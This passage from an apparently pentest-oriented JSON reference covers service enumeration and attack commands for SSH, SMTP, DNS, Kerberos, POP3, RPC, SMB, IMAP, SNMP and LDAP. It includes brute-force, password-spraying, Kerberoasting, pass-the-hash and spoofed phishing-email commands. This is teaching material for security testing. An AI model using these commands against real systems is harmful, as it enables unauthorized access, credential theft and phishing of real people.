                    "hydra -L users.txt -P passwords.txt -t 6 -vV ssh://<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "SSH Key-Based Login",
              "entries": [
                {
                  "subdesc": "If you find a private key (id_rsa, id_ecdsa, id_ed25519):",
                  "cmd": [
                    "chmod 600 id_rsa",
                    "ssh -i id_rsa <USER>@<TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "If the key is passphrase-protected, crack it:",
                  "cmd": [
                    "ssh2john id_rsa > id_rsa.hash",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] SSH version — is it outdated/vulnerable? (`searchsploit OpenSSH`)",
                    "# [ ] Weak key exchange algorithms? (potential downgrade)",
                    "# [ ] Password auth enabled? (brute force opportunity)",
                    "# [ ] SSH keys found on other services?",
                    "# [ ] SSH config file reveals interesting settings? (`/etc/ssh/sshd_config`)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-9",
          "name": "SMTP Enumeration (25/465/587)",
          "description": "SMTP (Simple Mail Transfer Protocol) typically runs on TCP ports 25 (plaintext), 465 (SMTPS), and 587 (submission). In penetration testing, SMTP is valuable for user enumeration (via VRFY/EXPN/RCPT TO), phishing (delivering malicious payloads), and relay abuse. An open relay can be leveraged to send spoofed emails from the target domain. Tip: SMTP user enumeration can reveal valid usernames for password spraying against other services (SSH, SMB, RDP). Always cross-reference discovered users.",
          "commands": [
            {
              "desc": "Nmap Script Enumeration",
              "entries": [
                {
                  "subdesc": "Enumerate SMTP users via Nmap:",
                  "cmd": [
                    "nmap -p 25 --script=smtp-enum-users <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Additional useful scripts:",
                  "cmd": [
                    "nmap -p 25 --script smtp-commands,smtp-open-relay,smtp-vuln-cve2010-4344 <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Manual User Verification",
              "entries": [
                {
                  "subdesc": "Connect and manually verify usernames with VRFY:",
                  "cmd": [
                    "nc -nv <TARGET-IP> 25",
                    "VRFY <username>"
                  ]
                }
              ]
            },
            {
              "desc": "Automated User Enumeration",
              "entries": [
                {
                  "cmd": [
                    "smtp-user-enum -M VRFY -U users.txt -t <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Sending Phishing Emails with SWAKS",
              "entries": [
                {
                  "subdesc": "SWAKS (Swiss Army Knife for SMTP) can deliver phishing payloads with attachments:",
                  "cmd": [
                    "swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test \"Header\" --server <TARGET-IP> --attach file.txt"
                  ]
                },
                {
                  "subdesc": "Send without authentication (open relay):",
                  "cmd": [
                    "swaks --to target@domain --from spoofed@domain --server <TARGET-IP> --body \"Check this\" --header \"Subject: URGENT\" --attach @payload.odt"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] VRFY/EXPN commands enabled? (user enumeration)",
                    "# [ ] Open relay? (send emails as any user)",
                    "# [ ] Valid usernames found? (cross-reference with other services)",
                    "# [ ] SMTP version vulnerable? (`searchsploit postfix/sendmail/exim`)",
                    "# [ ] TLS/STARTTLS supported? (check for downgrade attacks)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-10",
          "name": "DNS Enumeration (53)",
          "description": "DNS (Domain Name System) runs on TCP/UDP port 53 and is the backbone of network name resolution. For pentesters, DNS is critical for subdomain discovery, zone transfer attacks, and reverse lookups that reveal additional attack surface. A misconfigured DNS server that allows zone transfers can expose the entire internal network topology. Tip: If you find a web server with a TLS certificate revealing a commonName (e.g., mysite.test) and DNS is running, immediately test for zone transfers. This often reveals hidden vhosts and subdomains.",
          "commands": [
            {
              "desc": "Banner Grabbing",
              "entries": [
                {
                  "cmd": [
                    "dig @<TARGET-IP> version.bind CHAOS TXT"
                  ]
                },
                {
                  "cmd": [
                    "nmap -sV --script dns-nsid -p53 -Pn <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "DNS Enumeration",
              "entries": [
                {
                  "cmd": [
                    "whois <domain-or-ip>",
                    "host <name> <dns-server>",
                    "host -l <domain> <dns-server>",
                    "dig @<dns-server> -x <ip>",
                    "dig @<dns-server> <domain> <type>",
                    "dig @ns1.<domain> <domain> <type>"
                  ],
                  "subdesc": "Basic Lookups"
                }
              ]
            },
            {
              "desc": "DNS Zone Transfer Attack",
              "entries": [
                {
                  "subdesc": "A zone transfer replicates the entire DNS database. If allowed, it reveals all hostnames and IPs:",
                  "cmd": [
                    "host -T -l <domain.local> <TARGET-IP>"
                  ]
                },
                {
                  "cmd": [
                    "dig @<DOMAIN-IP> domain.com AXFR"
                  ]
                },
                {
                  "cmd": [
                    "dnsrecon -d <DOMAIN> -a"
                  ]
                }
              ]
            },
            {
              "desc": "Subdomain Brute Force",
              "entries": [
                {
                  "subdesc": "If a zone transfer succeeds and reveals additional server names, enumerate further:",
                  "cmd": [
                    "gobuster dns -r <TARGET-IP> -d <domain.local> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100"
                  ]
                },
                {
                  "subdesc": "Virtual host fuzzing via HTTP headers:",
                  "cmd": [
                    "ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
                  ]
                }
              ]
            },
            {
              "desc": "Configuration Files (Linux)",
              "entries": [
                {
                  "subdesc": "If you gain access to the DNS server, check:",
                  "cmd": [
                    "/etc/host.conf",
                    "/etc/resolv.conf",
                    "/etc/bind/named.conf",
                    "/etc/bind/named.conf.local    # Zone file paths",
                    "/etc/bind/named.conf.options  # Forwarders, recursion settings"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Zone transfer allowed? (`AXFR`)",
                    "# [ ] Reverse DNS reveals internal hostnames?",
                    "# [ ] Subdomains discovered via brute force?",
                    "# [ ] DNS server version revealed? (check for known vulns)",
                    "# [ ] Recursive queries enabled? (can be abused for DNS amplification)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-11",
          "name": "Finger Enumeration (79)",
          "description": "The Finger protocol runs on TCP port 79 and was designed to provide information about users on a remote system. While largely deprecated, it still appears on legacy systems and CTFs. When enabled, Finger reveals usernames, login times, idle status, and home directories — all valuable for building a target user list. Tip: If Finger is open, enumerate all users immediately. Cross-reference discovered usernames for brute-force attacks against SSH, FTP, or SMB.",
          "commands": [
            {
              "desc": "Basic User Enumeration",
              "entries": [
                {
                  "subdesc": "Query all logged-in users:",
                  "cmd": [
                    "finger @<TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Query a specific user:",
                  "cmd": [
                    "finger admin@<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Automated User Enumeration",
              "entries": [
                {
                  "subdesc": "Using pentestmonkey’s finger-user-enum script:",
                  "cmd": [
                    "finger-user-enum.pl -U users.txt -t <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Query a single user:",
                  "cmd": [
                    "finger-user-enum.pl -u root -t <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Scan multiple targets:",
                  "cmd": [
                    "finger-user-enum.pl -U users.txt -T ips.txt"
                  ]
                },
                {
                  "subdesc": "With grep to filter for valid logins:",
                  "cmd": [
                    "perl finger-user-enum.pl -t <TARGET-IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win \"Login\""
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Finger service responding? (often filtered)",
                    "# [ ] Valid usernames discovered?",
                    "# [ ] User details reveal useful info? (home dirs, shells, idle times)",
                    "# [ ] Cross-reference users with other services for brute force"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-12",
          "name": "HTTP(S) Enumeration (80/443)",
          "description": "HTTP/HTTPS runs on TCP ports 80 (HTTP) and 443 (HTTPS) and represents the largest attack surface in most engagements. Web server enumeration includes technology fingerprinting, directory/file discovery, virtual host enumeration, certificate inspection, and default credential testing. Tip: Before diving into directory brute-forcing, always check the page source, robots.txt, sitemap.xml, and HTTP response headers manually. Quick wins hide in plain sight.",
          "commands": [
            {
              "desc": "Fingerprinting Web Servers",
              "entries": [
                {
                  "cmd": [
                    "nmap -p 80 -sV --script=http-enum <TARGET-IP>"
                  ],
                  "subdesc": "Nmap"
                },
                {
                  "subdesc": "cURL Header Inspection — Inspect HTTP response headers (reveals server software, version, tech stack):",
                  "cmd": [
                    "curl -IL https://<TARGET>"
                  ]
                },
                {
                  "subdesc": "WhatWeb — Automated web application fingerprinting:",
                  "cmd": [
                    "whatweb -a 3 <URL>"
                  ]
                },
                {
                  "subdesc": "WhatWeb — Scan an entire subnet:",
                  "cmd": [
                    "whatweb --no-errors 10.10.10.0/24"
                  ]
                }
              ]
            },
            {
              "desc": "SSL/TLS Certificate Inspection",
              "entries": [
                {
                  "subdesc": "SSL/TLS certificates are a valuable source of information when HTTPS is in use. Certificates can reveal: Email addresses (useful for phishing) Company/organization name Common Name (CN) — may reveal internal hostnames or subdomains Subject Alternative Names (SANs) — additional domains/IPs covered by the cert Check certificate details:",
                  "cmd": [
                    "openssl s_client -connect <TARGET>:443 | openssl x509 -noout -text"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Page source reviewed? (comments, hidden fields, JS)",
                    "# [ ] `robots.txt` / `sitemap.xml` checked?",
                    "# [ ] Server version identified? (searchsploit it)",
                    "# [ ] Default credentials tested?",
                    "# [ ] TLS certificate inspected for hostnames/emails?",
                    "# [ ] Virtual hosts enumerated? (`ffuf` Host header fuzzing)",
                    "# [ ] Directory brute force completed?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-13",
          "name": "Kerberos Enumeration (88)",
          "description": "Kerberos runs on TCP/UDP port 88 and is the default authentication protocol in Active Directory environments. During enumeration, Kerberos can be leveraged for user enumeration (without credentials), AS-REP roasting (harvesting hashes from accounts with pre-auth disabled), and Kerberoasting (requesting service tickets to crack offline). Tip: Kerberos user enumeration does NOT generate standard logon failure events (Event ID 4625), making it stealthier than SMB or LDAP-based enumeration. Requires network access to the domain and knowledge of the domain name.",
          "commands": [
            {
              "desc": "Enumerating Users",
              "entries": [
                {
                  "cmd": [
                    "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=\"/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt\" <TARGET-IP>"
                  ],
                  "subdesc": "Nmap"
                },
                {
                  "subdesc": "Kerbrute — Fast and stealthy Kerberos user enumeration:",
                  "cmd": [
                    "./kerbrute userenum --dc <dc.local or TARGET-IP> -d <domain.local> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
                  ]
                },
                {
                  "subdesc": "Kerbrute — Kerbrute can also perform password spraying:",
                  "cmd": [
                    "./kerbrute passwordspray --dc <TARGET-IP> -d <domain.local> users.txt 'Password123!'"
                  ]
                }
              ]
            },
            {
              "desc": "Kerberoasting (Requires Credentials)",
              "entries": [
                {
                  "subdesc": "Request TGS tickets for service accounts and crack them offline:",
                  "cmd": [
                    "GetUserSPNs.py -request -dc-ip <TARGET-IP> <domain.local>/<username>"
                  ]
                },
                {
                  "subdesc": "Crack the extracted hash:",
                  "cmd": [
                    "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt"
                  ]
                }
              ]
            },
            {
              "desc": "AS-REP Roasting (No Credentials Required)",
              "entries": [
                {
                  "subdesc": "Target accounts with Kerberos pre-authentication disabled:",
                  "cmd": [
                    "GetNPUsers.py <domain.local>/ -usersfile users.txt -dc-ip <TARGET-IP> -no-pass -format hashcat"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Valid domain users enumerated via Kerbrute?",
                    "# [ ] Accounts with pre-auth disabled? (AS-REP roast)",
                    "# [ ] Service accounts with SPNs? (Kerberoast)",
                    "# [ ] Domain name and DC hostname confirmed?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-14",
          "name": "POP3 Enumeration (110/995)",
          "description": "POP3 (Post Office Protocol v3) runs on TCP port 110 (plaintext) and TCP port 995 (POP3S/TLS). POP3 allows clients to retrieve email from a mail server. In penetration testing, POP3 is useful for credential brute-forcing, reading emails that may contain passwords/sensitive data, and NTLM information leaks on Windows Exchange servers. Tip: If you find valid email credentials (from SMTP enumeration, password spraying, or other sources), always check POP3/IMAP for emails containing passwords, internal URLs, SSH keys, or other sensitive information.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -p 110,995 --script pop3-capabilities,pop3-ntlm-info <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Banner Grabbing",
              "entries": [
                {
                  "cmd": [
                    "# Netcat",
                    "nc -nv <TARGET-IP> 110",
                    "",
                    "# OpenSSL (for POP3S on port 995)",
                    "openssl s_client -connect <TARGET-IP>:995 -quiet"
                  ]
                }
              ]
            },
            {
              "desc": "Manual POP3 Interaction",
              "entries": [
                {
                  "subdesc": "Connect and authenticate manually:",
                  "cmd": [
                    "nc -nv <TARGET-IP> 110"
                  ]
                },
                {
                  "cmd": [
                    "USER <username>",
                    "PASS <password>"
                  ]
                },
                {
                  "cmd": [
                    "STAT            # Mailbox status (number of messages, total size)",
                    "LIST            # List all messages with sizes",
                    "LIST <msg#>     # Size of specific message",
                    "RETR <msg#>     # Retrieve/read a specific message",
                    "TOP <msg#> 0    # View headers only (no body)",
                    "TOP <msg#> 10   # View headers + first 10 lines",
                    "DELE <msg#>     # Mark message for deletion",
                    "RSET            # Reset — unmark deleted messages",
                    "QUIT            # Close connection (applies deletions)"
                  ],
                  "subdesc": "POP3 Commands"
                },
                {
                  "cmd": [
                    "# After authenticating:",
                    "STAT",
                    "# Shows: +OK <count> <size>",
                    "",
                    "# Loop through all messages:",
                    "RETR 1",
                    "RETR 2",
                    "RETR 3",
                    "# ... up to the count from STAT"
                  ],
                  "subdesc": "Read All Emails"
                }
              ]
            },
            {
              "desc": "NTLM Information Leak (Windows/Exchange)",
              "entries": [
                {
                  "subdesc": "On Windows mail servers, POP3 NTLM authentication can leak internal information:",
                  "cmd": [
                    "nmap -p 110 --script pop3-ntlm-info <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force POP3",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 4 pop3://<TARGET-IP>",
                    "",
                    "# For POP3S (port 995)",
                    "hydra -L users.txt -P passwords.txt -t 4 -s 995 pop3s://<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Automated Email Retrieval",
              "entries": [
                {
                  "cmd": [
                    "# List messages",
                    "curl -u '<USER>:<PASSWORD>' pop3://<TARGET-IP>/",
                    "",
                    "# Retrieve specific message",
                    "curl -u '<USER>:<PASSWORD>' pop3://<TARGET-IP>/1",
                    "curl -u '<USER>:<PASSWORD>' pop3://<TARGET-IP>/2",
                    "",
                    "# POP3S",
                    "curl -k -u '<USER>:<PASSWORD>' pop3s://<TARGET-IP>/"
                  ],
                  "subdesc": "Using curl"
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] POP3 banner grabbed? (version, server software)",
                    "# [ ] NTLM info leaked? (hostname, domain, OS)",
                    "# [ ] Valid credentials tested? (from SMTP enum or spraying)",
                    "# [ ] All emails read and searched for sensitive data?",
                    "# [ ] Attachments downloaded and inspected?",
                    "# [ ] Credentials found in emails tested on other services?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-15",
          "name": "RPC Enumeration (135)",
          "description": "Microsoft RPC (Remote Procedure Call) runs on TCP port 135 and is a critical Windows service for inter-process communication. For pentesters, RPC is valuable for null session enumeration — extracting domain users, groups, policies, and printer information without authentication. The rpcclient tool is the primary interface. Tip: RPC null sessions are one of the fastest ways to enumerate an AD domain. If rpcclient connects with empty credentials, you can dump the entire user list, group memberships, and password policies.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET-IP> -p 135"
                  ]
                }
              ]
            },
            {
              "desc": "Null Authentication",
              "entries": [
                {
                  "subdesc": "Attempt connection without credentials:",
                  "cmd": [
                    "rpcclient -U ''%'' <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Alternative:",
                  "cmd": [
                    "rpcclient <TARGET-IP> -N"
                  ]
                }
              ]
            },
            {
              "desc": "RPC Commands",
              "entries": [
                {
                  "subdesc": "Once connected, enumerate the domain:",
                  "cmd": [
                    "# List all domain users",
                    "enumdomusers",
                    "",
                    "# Extract usernames from output to a clean file",
                    "cat tmp | awk -F'\\[' '{print $2}' | awk -F'\\]' '{print $1}' > domain_users.txt",
                    "",
                    "# Read domain users' descriptions (may contain cleartext passwords!)",
                    "querydispinfo",
                    "",
                    "# Query specific domain user by RID",
                    "queryuser <RID>",
                    "",
                    "# Enumerate printers (may reveal internal hostnames)",
                    "enumprinters",
                    "",
                    "# Enumerate domain groups",
                    "enumdomgroups",
                    "",
                    "# Query group details",
                    "querygroup <RID>",
                    "",
                    "# List group members",
                    "querygroupmem <RID>"
                  ]
                }
              ]
            },
            {
              "desc": "Modifying User Information",
              "entries": [
                {
                  "cmd": [
                    "setuserinfo2 <username> 23 <new-password>"
                  ],
                  "subdesc": "Reset a User Password (if write access)"
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Null session allowed? (`rpcclient -U ''%''`)",
                    "# [ ] Domain users enumerated? (`enumdomusers`)",
                    "# [ ] User descriptions reveal passwords? (`querydispinfo`)",
                    "# [ ] Domain groups and memberships mapped?",
                    "# [ ] Password policy retrieved? (`getdompwinfo`)",
                    "# [ ] Printers reveal internal hostnames?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-16",
          "name": "SMB Enumeration (139/445)",
          "description": "SMB (Server Message Block) runs on TCP ports 139 (NetBIOS) and 445 (direct SMB). SMB is arguably the most important service to enumerate in any Windows environment. It provides file sharing, printer access, and is tightly integrated with Active Directory. Key attack vectors include null sessions, anonymous share access, credential brute-forcing, pass-the-hash, and known vulnerabilities (EternalBlue, PrintNightmare). Tip: SMB enumeration should be one of your FIRST steps on any Windows target. Anonymous shares, null sessions, and writable shares are all common quick wins.",
          "commands": [
            {
              "desc": "Anonymous & Null Session Access",
              "entries": [
                {
                  "cmd": [
                    "smbclient -L //<TARGET-IP> -U anonymous",
                    "smbclient -N -L //<TARGET-IP>"
                  ],
                  "subdesc": "List Shares Anonymously"
                },
                {
                  "cmd": [
                    "smbclient --no-pass //<TARGET-IP>/anonymous"
                  ],
                  "subdesc": "Connect to Anonymous Share"
                },
                {
                  "cmd": [
                    "smbclient -N //<TARGET-IP>/<SHARE>"
                  ],
                  "subdesc": "Null Session"
                }
              ]
            },
            {
              "desc": "CrackMapExec Enumeration",
              "entries": [
                {
                  "subdesc": "The Swiss Army knife for SMB enumeration:",
                  "cmd": [
                    "# Enumerate users and RID brute force",
                    "crackmapexec smb <TARGET-IP> -u '' -p '' --users --rid-brute",
                    "",
                    "# Get password policy",
                    "crackmapexec smb <TARGET-IP> -u '' -p '' --pass-pol",
                    "",
                    "# List all shares",
                    "crackmapexec smb <TARGET-IP> -u '' -p '' --shares",
                    "",
                    "# Spider a share for interesting files",
                    "crackmapexec smb <TARGET-IP> -u '' -p '' --spider <share> --regex ."
                  ]
                }
              ]
            },
            {
              "desc": "Authenticated SMB Login",
              "entries": [
                {
                  "cmd": [
                    "smbclient //<TARGET-IP>/SYSVOL -U <USER>",
                    "smbclient -p 445 //<TARGET-IP>/<SHARE> -U <username> --password=<password>"
                  ],
                  "subdesc": "With Password"
                },
                {
                  "cmd": [
                    "smbclient -L //<TARGET-IP> -U test.local/john --pw-nt-hash <hash>",
                    "pth-smbclient //<TARGET-IP>/<SHARE> -U 'DOMAIN\\USERNAME%NTLM_HASH'"
                  ],
                  "subdesc": "With NTLM Hash (Pass-the-Hash)"
                }
              ]
            },
            {
              "desc": "Enum4Linux",
              "entries": [
                {
                  "subdesc": "Comprehensive SMB/NetBIOS enumeration tool:",
                  "cmd": [
                    "enum4linux -a <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Nmap SMB Scripts",
              "entries": [
                {
                  "cmd": [
                    "nmap -v -p 139,445 --script smb-os-discovery <IP-RANGE>"
                  ],
                  "subdesc": "OS Discovery Across a Range"
                },
                {
                  "cmd": [
                    "nmap --script smb-vuln* -p 139,445 <TARGET-IP>"
                  ],
                  "subdesc": "Vulnerability Scanning"
                }
              ]
            },
            {
              "desc": "Basic SMB Commands (Once Connected)",
              "entries": [
                {
                  "cmd": [
                    "RECURSE ON",
                    "PROMPT OFF",
                    "mget *          # Download everything recursively",
                    "ls / dir        # List files",
                    "get <file>      # Download specific file",
                    "put <file>      # Upload file (if writable)"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force SMB Credentials",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Anonymous/null session access?",
                    "# [ ] Shares enumerated? (look for writable shares, SYSVOL, NETLOGON)",
                    "# [ ] Users enumerated via RID brute force?",
                    "# [ ] Password policy retrieved?",
                    "# [ ] SMB version vulnerable? (EternalBlue, MS08-067)",
                    "# [ ] Sensitive files in shares? (scripts, configs, credentials)",
                    "# [ ] Pass-the-hash possible with found hashes?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-17",
          "name": "IMAP Enumeration (143/993)",
          "description": "IMAP (Internet Message Access Protocol) runs on TCP port 143 (plaintext) and 993 (IMAPS/TLS). In penetration testing, IMAP allows you to enumerate users via NTLM info leaks, access mailboxes with stolen credentials, and deliver phishing payloads to internal users. Email accounts frequently contain sensitive information including passwords, internal documentation, and configuration details. Tip: If you compromise email credentials, always check the mailbox. Internal emails frequently contain passwords, network diagrams, or credentials for other systems.",
          "commands": [
            {
              "desc": "Nmap NTLM Information Leak",
              "entries": [
                {
                  "subdesc": "Extract domain/hostname information from IMAP NTLM authentication:",
                  "cmd": [
                    "nmap -p 143 --script imap-ntlm-info.nse <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting to Mailbox (With Credentials)",
              "entries": [
                {
                  "subdesc": "Connect via netcat:",
                  "cmd": [
                    "nc <TARGET-IP> 143"
                  ]
                },
                {
                  "cmd": [
                    "# Authenticate",
                    "tag login USER@localhost PASSWORD",
                    "",
                    "# List all mailboxes",
                    "tag LIST \"\" \"*\"",
                    "",
                    "# Select a mailbox",
                    "tag SELECT INBOX",
                    "",
                    "# Check message count",
                    "tag STATUS INBOX (MESSAGES)",
                    "",
                    "# Fetch message headers and body",
                    "tag fetch <message-number> BODY[HEADER] BODY[1]"
                  ],
                  "subdesc": "IMAP Commands"
                }
              ]
            },
            {
              "desc": "Sending Phishing Emails",
              "entries": [
                {
                  "subdesc": "Deliver a malicious .odt file via SMTP (commonly paired with IMAP access):",
                  "cmd": [
                    "swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET-IP> --body \"Please check this out\" --header \"Subject: IMPORTANT UPDATE\""
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] NTLM info leak reveals domain details?",
                    "# [ ] Login possible with found credentials?",
                    "# [ ] Sensitive emails in mailbox? (passwords, configs, internal docs)",
                    "# [ ] IMAP version vulnerable? (`searchsploit`)",
                    "# [ ] TLS/STARTTLS supported?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-18",
          "name": "SNMP Enumeration (161)",
          "description": "SNMP (Simple Network Management Protocol) runs on UDP port 161 and is used for network device management and monitoring. SNMP is a treasure trove for pentesters because it can reveal running processes, installed software, user accounts, network interfaces, TCP ports, and storage information — all through a simple community string (often left as the default public). Tip: SNMP enumeration can reveal information that NO other service provides — especially running processes (which might include credentials in command-line arguments) and installed software (for known exploit matching).",
          "commands": [
            {
              "desc": "Scanning for SNMP Services",
              "entries": [
                {
                  "cmd": [
                    "nmap -sU --open -p 161 192.168.0.1-254 -oG open-snmp.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force Community Strings",
              "entries": [
                {
                  "subdesc": "Using onesixtyone:",
                  "cmd": [
                    "onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>"
                  ]
                }
              ]
            },
            {
              "desc": "SNMP Enumeration with snmpwalk",
              "entries": [
                {
                  "subdesc": "Once you have a valid community string, query everything:",
                  "cmd": [
                    "snmpwalk -c <COMMUNITY-STRING> -v1 -t 10 <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Targeted Queries — Windows user accounts:",
                  "cmd": [
                    "snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.4.1.77.1.2.25"
                  ]
                },
                {
                  "subdesc": "Targeted Queries — Running processes (check for credentials in command-line args):",
                  "cmd": [
                    "snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.4.2.1.2"
                  ]
                },
                {
                  "subdesc": "Targeted Queries — Installed software (match against known exploits):",
                  "cmd": [
                    "snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.6.3.1.2"
                  ]
                },
                {
                  "subdesc": "Targeted Queries — TCP listening ports:",
                  "cmd": [
                    "snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.6.13.1.3"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] SNMP port open? (UDP 161 — easy to miss without `sU`)",
                    "# [ ] Default community string `public` works?",
                    "# [ ] User accounts enumerated?",
                    "# [ ] Running processes reveal credentials?",
                    "# [ ] Installed software matches known exploits?",
                    "# [ ] TCP ports revealed match nmap results?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-19",
          "name": "LDAP(S) Enumeration (389/636/3268/3269)",
          "description": "LDAP runs on TCP ports 389 (plaintext), 636 (LDAPS), 3268 (Global Catalog), and 3269 (Global Catalog over SSL). LDAP is the directory service protocol underpinning Active Directory. Successful enumeration can reveal the entire AD structure: users, computers, groups, organizational units, group policies, and service accounts. Tip: Anonymous LDAP binds are surprisingly common. Always attempt null/anonymous authentication first — it can dump the entire directory without any credentials.",
          "commands": [
            {
              "desc": "Anonymous LDAP Enumeration",
              "entries": [
                {
                  "cmd": [
                    "target_domain='domain.tld'",
                    "target_hostname=\"DC01.${target_domain}\"",
                    "domain_component=$(echo $target_domain | tr '.' '\\n' | xargs -I % echo \"DC=%\" | paste -sd, -)",
                    "",
                    "ldapsearch -x -H ldap://$target_hostname -b $domain_component"
                  ],
                  "subdesc": "Quick Method"
                },
                {
                  "cmd": [
                    "# Discover naming contexts",
                    "ldapsearch -x -h <RHOSTS> -s base namingcontexts",
                    "",
                    "# Enumerate all objects",
                    "ldapsearch -x -h <RHOSTS> -s sub -b 'DC=foo,DC=tld'"
                  ],
                  "subdesc": "Alternative Syntax"
                },
                {
                  "cmd": [
                    "ldapsearch -x -v -H ldap://<TARGET-IP> -b \"DC=DOMAIN,DC=LOCAL\" 'objectClass=*'"
                  ],
                  "subdesc": "Check for Anonymous Bind"
                }
              ]
            },
            {
              "desc": "Authenticated LDAP Enumeration",
              "entries": [
                {
                  "subdesc": "With credentials, pull specific attributes:",
                  "cmd": [
                    "# Enumerate SAM account names",
                    "ldapsearch -x -H ldap://<RHOSTS> -b 'DC=support,DC=htb' -D '<username>\\ldap' -w '<password>' 'sAMAccountName' | grep sAMAccountName",
                    "",
                    "# Query specific user details",
                    "ldapsearch -x -H ldap://<RHOSTS> -b 'DC=support,DC=htb' -D 'support\\ldap' -w '<password>' -b 'CN=support,CN=Users,DC=support,DC=htb'"
                  ]
                },
                {
                  "cmd": [
                    "ldapsearch -x -H ldap://$target_hostname -b $domain_component 'objectClass=*'"
                  ],
                  "subdesc": "Pull Everything (if enumeration succeeds)"
                }
              ]
            },
            {
              "desc": "LDAPsearcher Script",
              "entries": [
                {
                  "subdesc": "Automated interactive LDAP enumeration script supporting both null and credential-based authentication:",
                  "cmd": [
                    "#!/bin/bash",
                    "",
                    "clear",
                    "echo \"=== LDAP Searcher ===\"",
                    "",
                    "read -p \"Authentication type ('null' or 'creds'): \" auth_type",
                    "",
                    "username=\"\"",
                    "password=\"\"",
                    "domain=\"\"",
                    "ip=\"\"",
                    "dc_string=\"\"",
                    "",
                    "if [[ \"$auth_type\" == \"creds\" ]]; then",
                    "    read -p \"Username (DOMAIN\\\\username): \" username",
                    "    read -s -p \"Password: \" password",
                    "    echo",
                    "fi",
                    "",
                    "read -p \"Target Domain Controller IP: \" ip",
                    "read -p \"Domain name (e.g. domain.local): \" domain",
                    "",
                    "# Convert domain to DC string",
                    "IFS='.' read -ra domain_parts <<< \"$domain\"",
                    "dc_string=\"\"",
                    "for part in \"${domain_parts[@]}\"; do",
                    "    dc_string+=\"DC=$part,\"",
                    "done",
                    "dc_string=\"${dc_string%,}\"",
                    "",
                    "echo -e \"\\n=== Running Base LDAP Searches ===\"",
                    "",
                    "if [[ \"$auth_type\" == \"null\" ]]; then",
